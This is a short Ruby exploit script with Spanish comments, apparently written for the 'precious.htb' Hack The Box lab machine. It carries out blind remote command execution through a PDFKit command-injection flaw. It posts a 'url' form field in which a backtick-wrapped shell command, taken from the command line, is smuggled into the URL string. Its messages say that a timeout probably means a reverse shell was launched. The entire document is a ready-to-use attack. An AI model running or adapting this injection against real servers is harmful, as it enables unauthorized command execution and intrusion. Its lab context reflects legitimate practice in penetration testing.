require 'http'

$url_site = "http://precious.htb"
$args = ARGV

def validate_args_and_connection()
  unless ! $args[0].nil?
    puts "\nuso: #{File.basename($0)} 'comando a ejecutar'"
    exit(1)
  end

  begin
    r = HTTP.timeout(5).get($url_site)
  rescue HTTP::TimeoutError => e
    puts "\n(-) Valida tu conexión contra el dominio 'precious.htb' (puede ser VPN o /etc/hosts)."
    exit(1)
  end
end

def main()
  payload = "http://?=\#{'%20`#{$args[0]}`'}"

  begin
    r = HTTP.timeout(3).post($url_site, :form => {
      :url => payload
    })
  rescue HTTP::TimeoutError => e
    puts "\n(+) Lo más probable es que hayas ejecutado una Reverse Shell, sino, intenta de nuevo o valida conexión."
    exit(0)
  end
end

# Empezamos a ejecutar la locura...
puts "PDFKit 0.0.0 - ejecución remota de comandos ciega."
validate_args_and_connection
main
